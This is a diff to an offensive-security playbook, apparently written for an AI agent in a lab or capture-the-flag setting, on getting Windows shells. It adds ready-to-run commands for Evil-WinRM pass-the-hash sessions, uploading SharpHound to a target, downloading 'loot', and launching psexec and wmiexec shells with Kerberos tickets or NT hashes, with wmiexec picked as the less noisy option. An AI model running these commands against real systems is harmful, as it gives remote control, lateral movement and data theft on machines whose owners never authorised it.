@@ -389,7 +389,7 @@ nxc smb TARGET.DOMAIN.LOCAL --use-kcache --sam
 nxc smb TARGET.DOMAIN.LOCAL --use-kcache --shares
 ```
 
-### Evil-WinRM (WinRM Shell)
+### Evil-WinRM (WinRM Shell — Port 5985/5986)
 
 ```bash
 # With password
@@ -397,6 +397,44 @@ evil-winrm -i TARGET.DOMAIN.LOCAL -u Administrator -p 'Password123'
 
 # With hash
 evil-winrm -i TARGET.DOMAIN.LOCAL -u Administrator -H NTHASH
+```
+
+**Via `start_process` (preferred for persistent sessions):**
+
+```python
+# Spawn evil-winrm in a persistent PTY
+start_process(command="evil-winrm -i TARGET -u Administrator -H NTHASH", label="ewrm-target")
+
+# Interact via send_command
+send_command(session_id=..., command="whoami")
+```
+
+**File transfer via evil-winrm (preferred on Windows):** Evil-WinRM's built-in
+`upload` and `download` commands are more reliable than SMB file transfer for
+moving tools, scripts, and loot to/from Windows targets:
+
+```
+# Upload tools to target
+send_command(session_id=..., command="upload /opt/tools/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe")
+
+# Download loot
+send_command(session_id=..., command="download C:\\Users\\Administrator\\Desktop\\root.txt ./root.txt")
+```
+
+### Impacket via `start_process`
+
+For interactive Impacket shells (psexec.py, wmiexec.py, smbexec.py), use
+`start_process` to maintain session persistence:
+
+```python
+# Interactive psexec shell (port 445)
+start_process(command="psexec.py DOMAIN/user@TARGET -k -no-pass", label="psexec-target")
+
+# Interactive wmiexec shell (port 135 — less noisy)
+start_process(command="wmiexec.py DOMAIN/user@TARGET -k -no-pass", label="wmiexec-target")
+
+# With hash directly
+start_process(command="wmiexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH", label="wmiexec-target")
 ```
 
 ### Verify Access
